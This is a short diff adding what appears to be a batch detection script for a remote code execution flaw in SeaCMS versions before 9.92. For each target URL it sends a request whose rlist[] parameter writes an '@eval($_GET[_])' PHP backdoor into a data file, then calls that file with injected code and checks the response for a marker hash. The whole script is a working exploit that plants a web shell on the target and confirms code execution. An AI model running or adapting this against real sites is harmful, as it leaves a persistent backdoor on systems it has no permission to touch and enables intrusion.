@@ -1,0 +1,25 @@
+#request urls = array
+#define ppp = /comment/api/index.php?gid=1&page=2&rlist[]=*hex/@eval($_GET[_])%3B%3F%3E
+#define payload = /data/mysqli_error_trace.php?_=printf(md5(\"99999999\"))%3B
+#define bug = ef775988943825d2871e1cfa75473ec
+#define info = seacms-before-v992-rce
+
+function main(args){
+	printclolor("当前正在检测:".info,1);
+	i = 0;
+	num = GetArrayNum(urls);
+	while(i<num){
+		url = urls[i];
+		try{
+			HttpGet(url.ppp,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0");
+			res = HttpGet(url.payload,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0");
+			if(StrFindStr(res[0],bug,0)!= "-1")
+			{
+				printclolor("[+]".urls[i].info,3);
+			}
+		}catch{
+		}
+		i = ToInt(i+1);
+	}
+	
+}
